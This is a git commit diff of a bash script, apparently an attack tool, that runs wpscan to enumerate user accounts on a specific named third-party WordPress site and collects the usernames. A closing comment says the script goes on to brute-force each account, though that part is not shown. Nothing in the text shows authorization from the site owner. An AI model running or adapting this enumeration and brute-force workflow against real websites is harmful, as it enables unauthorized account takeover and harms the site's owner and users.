c3129861723e073b4704cc0441874c104bb3bddc
meepmaster360 <paulomotaborges@gmail.com>
2024-04-09 13:41:03 +0100

    1

--- wpscanmeep2.sh
+++ wpscanmeep2.sh
@@ -8,12 +8,31 @@
 
 # Perform user enumeration
 
-function user_enumeration () {
+function user_enumeration() {
     echo "Performing user enumeration..."
-    wpscan --url https://www.evasoes.pt/  --enumerate u > user_enum.txt
-    # Extract usernames from the user enumeration result
-    USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
-} 
+    # Run wpscan and redirect output to a temporary file
+    wpscan --url https://www.evasoes.pt/ --enumerate u > user_enum_tmp.txt
+    
+    # Check if the wpscan command was successful
+    if [ $? -eq 0 ]; then
+        # Extract usernames from the user enumeration result
+        USERLIST=$(grep 'Username:' user_enum_tmp.txt | awk '{print $2}')
+        
+        # Check if any usernames were found
+        if [ -n "$USERLIST" ]; then
+            echo "User enumeration successful. Usernames: $USERLIST"
+            # Move the temporary file to user_enum.txt
+            mv user_enum_tmp.txt user_enum.txt
+        else
+            echo "No usernames found in the enumeration result."
+            rm user_enum_tmp.txt  # Remove the temporary file
+        fi
+    else
+        echo "Error: Failed to run wpscan."
+        rm user_enum_tmp.txt  # Remove the temporary file
+    fi
+}
+
 
 
 # Perform brute force attack for each username
